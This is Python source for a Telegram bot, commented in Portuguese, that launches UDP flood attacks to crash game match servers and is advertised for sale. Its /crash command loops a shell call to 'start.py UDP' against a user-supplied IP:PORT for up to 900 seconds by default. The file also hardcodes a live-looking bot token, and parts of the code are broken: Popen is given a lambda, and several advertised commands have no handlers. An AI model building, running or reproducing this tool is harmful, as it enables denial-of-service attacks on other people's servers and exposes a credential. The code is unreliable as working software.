import telebot
import subprocess
import re
import time
import json
from datetime import datetime

# Configurações do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para carregar usuários autorizados de um arquivo JSON
def carregar_usuarios():
    try:
        with open("usuarios_autorizados.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padrão
    except json.JSONDecodeError:
        return [SEU_ID_TELEGRAM]

# Função para salvar usuários autorizados em um arquivo JSON
def salvar_usuarios():
    with open("usuarios_autorizados.json", "w") as f:
        json.dump(authorized_users, f)

# Lista de usuários autorizados
authorized_users = carregar_usuarios()

# Função para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Função para gerenciar o limite de ataques simultâneos
def gerenciar_ataques():
    if len(processos) >= MAX_ATTACKS:
        ataque_antigo = list(processos.keys())[0]
        processo_antigo = processos.pop(ataque_antigo)
        processo_antigo.terminate()
        bot.send_message(SEU_ID_TELEGRAM, f"Ataque para {ataque_antigo} finalizado para liberar espaço.")

# Função para executar ataques contínuos até o tempo total ser atingido
def executar_ataque(ip_porta, threads, tempo_total):
    start_time = time.time()
    while time.time() - start_time < int(tempo_total):
        comando_terminal = f"python3 start.py UDP {ip_porta} {threads} 60"  # Executa em intervalos de 60s
        subprocess.run(comando_terminal, shell=True)
    bot.send_message(SEU_ID_TELEGRAM, f"Ataque finalizado para {ip_porta} após {tempo_total} segundos.")

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "*Comandos básicos:*\n"
        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
        "(Padrão 900 segundos)\n"
        "`/meuid` - Mostra seu ID de usuário.\n"
        "`/info_player <ID>` - Exibe informações de um jogador por ID.\n\n"
        "*Comandos para o dono do bot:*\n"
        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
        "`/listusers` - Mostra a lista de usuários autorizados e seus cargos.\n\n"
        "Quer comprar o bot? Entre em contato comigo no Telegram: "
        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
        "_Se precisar de ajuda, estou à disposição!_ 😉"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
        return

    ip_porta = comando[1]
    threads = "10"  # Padrão
    tempo = "900"   # Padrão

    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
        return

    if len(comando) == 3:
        tempo = comando[2]
    elif len(comando) == 4:
        threads = comando[2]
        tempo = comando[3]

    if ip_porta in processos:
        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
        return

    gerenciar_ataques()
    processo = subprocess.Popen(
        lambda: executar_ataque(ip_porta, threads, tempo),
        shell=False
    )
    processos[ip_porta] = processo
    bot.send_message(
        message.chat.id,
        f"Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos."
    )

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Função principal
def main():
    while True:
        try:
            bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

if __name__ == "__main__":
    main()